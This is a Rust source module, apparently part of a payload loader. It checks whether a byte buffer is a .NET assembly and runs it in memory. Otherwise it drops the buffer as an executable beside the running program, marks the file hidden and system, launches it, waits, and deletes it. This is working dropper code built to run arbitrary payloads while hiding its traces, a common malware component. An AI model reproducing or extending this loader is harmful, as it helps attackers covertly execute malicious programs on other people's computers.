pub fn is_dotnet_assembly(data: &[u8]) -> bool {
    if data.len() < 512 {
        return false;
    }
    if data[0] != b'M' || data[1] != b'Z' {
        return false;
    }
    let pe_off =
        u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
    if pe_off + 280 > data.len() {
        return false;
    }
    if u32::from_le_bytes([data[pe_off], data[pe_off + 1], data[pe_off + 2], data[pe_off + 3]])
        != 0x00004550
    {
        return false;
    }
    let magic = u16::from_le_bytes([data[pe_off + 24], data[pe_off + 25]]);
    let clr_dir_off = if magic == 0x10b {
        pe_off + 24 + 208
    } else if magic == 0x20b {
        pe_off + 24 + 224
    } else {
        return false;
    };
    if clr_dir_off + 8 > data.len() {
        return false;
    }
    let clr_rva = u32::from_le_bytes([
        data[clr_dir_off],
        data[clr_dir_off + 1],
        data[clr_dir_off + 2],
        data[clr_dir_off + 3],
    ]);
    clr_rva != 0
}

#[cfg(not(windows))]
pub fn run_payload(_data: &[u8]) -> i32 {
    -100
}

#[cfg(windows)]
pub fn run_payload(data: &[u8]) -> i32 {
    if is_dotnet_assembly(data) {
        crate::dotnet_loader::run_dotnet_inmemory(data)
    } else {
        native_impl::run_native_inproc(data)
    }
}

#[cfg(windows)]
mod native_impl {
    use std::ffi::c_void;
    use std::ptr;

    #[repr(C)]
    #[allow(non_snake_case)]
    struct StartupInfoW {
        cb: u32,
        lpReserved: *mut u16,
        lpDesktop: *mut u16,
        lpTitle: *mut u16,
        dwX: u32, dwY: u32, dwXSize: u32, dwYSize: u32,
        dwXCountChars: u32, dwYCountChars: u32,
        dwFillAttribute: u32,
        dwFlags: u32,
        wShowWindow: u16,
        cbReserved2: u16,
        lpReserved2: *mut u8,
        hStdInput: isize,
        hStdOutput: isize,
        hStdError: isize,
    }

    #[repr(C)]
    struct ProcessInformation {
        process: isize,
        thread: isize,
        process_id: u32,
        thread_id: u32,
    }

    #[allow(non_snake_case)]
    extern "system" {
        fn CreateProcessW(
            app: *const u16, cmd: *mut u16,
            proc_attr: *mut c_void, thread_attr: *mut c_void,
            inherit: i32, flags: u32,
            env: *mut c_void, dir: *const u16,
            si: *const StartupInfoW, pi: *mut ProcessInformation,
        ) -> i32;
        fn WaitForSingleObject(handle: isize, ms: u32) -> u32;
        fn CloseHandle(handle: isize) -> i32;
        fn SetFileAttributesW(lpFileName: *const u16, dwFileAttributes: u32) -> i32;
    }

    fn wide(s: &str) -> Vec<u16> {
        let mut v: Vec<u16> = s.encode_utf16().collect();
        v.push(0);
        v
    }

    pub fn run_native_inproc(data: &[u8]) -> i32 {
        if data.len() < 64 || data[0] != b'M' || data[1] != b'Z' {
            return -1;
        }

        let app_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.to_string_lossy().to_string()))
            .unwrap_or_else(|| ".".to_string());
        let app_dir = app_dir.trim_end_matches('\\').to_string();

        let exe_path = format!("{}\\~s{}.exe", app_dir, std::process::id());

        if std::fs::write(&exe_path, data).is_err() {
            return -10;
        }

        const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
        const FILE_ATTRIBUTE_SYSTEM: u32 = 0x4;
        unsafe {
            SetFileAttributesW(
                wide(&exe_path).as_ptr(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
            );
        }

        unsafe {
            let cmd_str = format!("\"{}\"", exe_path);
            let mut cmd = wide(&cmd_str);

            let si = StartupInfoW {
                cb: std::mem::size_of::<StartupInfoW>() as u32,
                lpReserved: ptr::null_mut(),
                lpDesktop: ptr::null_mut(),
                lpTitle: ptr::null_mut(),
                dwX: 0, dwY: 0, dwXSize: 0, dwYSize: 0,
                dwXCountChars: 0, dwYCountChars: 0,
                dwFillAttribute: 0,
                dwFlags: 0,
                wShowWindow: 0,
                cbReserved2: 0,
                lpReserved2: ptr::null_mut(),
                hStdInput: 0,
                hStdOutput: 0,
                hStdError: 0,
            };

            let mut pi = ProcessInformation {
                process: 0, thread: 0, process_id: 0, thread_id: 0,
            };

            let dir_wide = wide(&app_dir);
            let created = CreateProcessW(
                ptr::null(),
                cmd.as_mut_ptr(),
                ptr::null_mut(), ptr::null_mut(),
                0, 0,
                ptr::null_mut(), dir_wide.as_ptr(),
                &si, &mut pi,
            );

            if created == 0 {
                let _ = std::fs::remove_file(&exe_path);
                return -11;
            }

            WaitForSingleObject(pi.process, 0xFFFFFFFF);
            CloseHandle(pi.thread);
            CloseHandle(pi.process);
            let _ = std::fs::remove_file(&exe_path);

            0
        }
    }
}
